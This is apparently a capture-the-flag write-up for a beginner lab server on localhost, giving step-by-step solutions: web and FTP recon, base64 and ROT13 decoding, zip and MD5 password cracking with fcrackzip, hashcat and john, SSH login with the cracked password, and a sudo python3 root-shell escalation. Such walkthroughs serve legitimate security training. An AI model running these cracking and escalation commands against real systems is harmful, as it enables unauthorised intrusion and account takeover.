# Writeup — Orientation Server (SPOILERS)

Flag values below are placeholders (`HLC{...}`) since real values are
per-deployment secrets. Replace with what your own instance gives you.

1. `curl http://localhost:8001/` or view-source in a browser → flag in an
   HTML comment.
2. `curl http://localhost:8001/robots.txt` → `Disallow: /welcome/` →
   `curl http://localhost:8001/welcome/` → flag in the page.
3. `ftp localhost 2101` (user `anonymous`, any password) → `get flag3.txt`.
4. `curl http://localhost:8001/files/notes.txt`, take the base64 blob,
   `echo '<blob>' | base64 -d`.
5. `curl http://localhost:8001/files/cipher.txt`, decode ROT13 (CyberChef
   "ROT13" recipe, or `python3 -c "import codecs;print(codecs.decode(open('cipher.txt').read(),'rot_13'))"`).
6. `badge-memo.txt` says the PIN is the building's opening year (1973).
   `curl -O http://localhost:8001/files/secrets.zip` then
   `unzip -P 1973 secrets.zip` (or brute-force it blind with
   `fcrackzip -b -c '1234567890' -l 4-4 secrets.zip` to practice the tool).
7. `password_audit.txt` has an MD5 hash for user `jmiller`. Crack it:
   `hashcat -m 0 -a 0 hash.txt rockyou.txt` or `john --format=raw-md5
   --wordlist=rockyou.txt hash.txt`. It cracks to `superman1`. Then decrypt
   the paired file: `openssl enc -aes-256-cbc -pbkdf2 -d -k superman1 -in
   handoff.enc`.
8. `ssh -p 2201 jmiller@localhost`, password `superman1`, then
   `cat flag8.txt` in the home directory.
9. `ls -la` in the home directory shows `.config/`; inside it,
   `cat .config/.flag9`.
10. `sudo -l` shows `(root) NOPASSWD: /usr/bin/python3`. Look it up on
    gtfobins.github.io ("python" entry, sudo section):
    `sudo python3 -c 'import os; os.system("/bin/bash")'`, then
    `cat /root/flag10.txt`.

## Honeypots encountered (intentional, cost time only)
- `/admin/` — static login form, no backend, always says access denied.
- `files/flag_fake.txt` — explicitly tells you it isn't a real flag.
- `ftp/old_creds.txt` — a list of credentials that don't work anywhere.
